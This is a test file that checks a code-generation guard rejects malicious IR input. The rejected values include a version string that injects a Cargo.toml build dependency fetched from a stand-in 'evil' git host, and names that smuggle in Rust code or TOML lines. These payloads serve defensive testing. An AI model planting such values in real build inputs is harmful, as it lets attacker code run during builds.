import { describe, expect, it } from "vitest";
import { readdirSync, readFileSync, existsSync } from "node:fs";
import path from "node:path";
import { validateIrForBuild } from "../server/ir-guard";

const TEMPLATES = path.resolve(__dirname, "../../../../packages/codegen/src/templates");

const baseIr = () => ({
  program: { name: "my_program", version: "0.1.0", description: "A vault, \"quoted\" is fine here" },
  instructions: [{ name: "initialize", accounts: [{ name: "authority" }], args: [{ name: "amount" }] }],
  states: [{ name: "VaultState", fields: [{ name: "total" }] }],
  errors: [{ name: "Unauthorized" }],
  events: [],
});

describe("IR build guard", () => {
  it("accepts every built-in template", () => {
    const dirs = readdirSync(TEMPLATES).filter((d) => existsSync(path.join(TEMPLATES, d, "template.json")));
    expect(dirs.length).toBeGreaterThan(0);
    for (const d of dirs) {
      const ir = JSON.parse(readFileSync(path.join(TEMPLATES, d, "template.json"), "utf8"));
      expect(validateIrForBuild(ir), d).toEqual({ ok: true });
    }
  });

  it("accepts a normal IR", () => {
    expect(validateIrForBuild(baseIr())).toEqual({ ok: true });
  });

  it("rejects the Cargo.toml injection from the audit (version with newline + quote)", () => {
    const ir = baseIr();
    ir.program.version = '0.1.0"\n[build-dependencies]\nevil = { git = "https://example.invalid/evil" }\n#';
    const res = validateIrForBuild(ir);
    expect(res.ok).toBe(false);
    if (!res.ok) expect(res.message).toContain("program.version");
  });

  it("rejects non-identifier names anywhere they become Rust code", () => {
    const cases: Array<(ir: ReturnType<typeof baseIr>) => void> = [
      (ir) => (ir.program.name = 'x"\n[dependencies]'),
      (ir) => (ir.program.name = "my program"),
      (ir) => (ir.instructions[0].name = "init(); evil()"),
      (ir) => (ir.instructions[0].accounts[0].name = "a b"),
      (ir) => (ir.instructions[0].args[0].name = "x\ny"),
      (ir) => (ir.states[0].name = "State{}"),
      (ir) => (ir.states[0].fields[0].name = "f-1"),
      (ir) => (ir.errors[0].name = "E\""),
    ];
    for (const mutate of cases) {
      const ir = baseIr();
      mutate(ir);
      expect(validateIrForBuild(ir).ok).toBe(false);
    }
  });

  it("rejects multi-line descriptions and quoted licenses", () => {
    const a = baseIr();
    a.program.description = "line1\nline2";
    expect(validateIrForBuild(a).ok).toBe(false);
    const b = { ...baseIr(), program: { ...baseIr().program, license: 'MIT"\nevil' } };
    expect(validateIrForBuild(b).ok).toBe(false);
  });

  it("rejects non-semver versions", () => {
    for (const v of ["1", "v1.0.0", "1.0", "1.0.0 ", "1.0.0\n"]) {
      const ir = baseIr();
      ir.program.version = v;
      expect(validateIrForBuild(ir).ok, v).toBe(false);
    }
  });
});
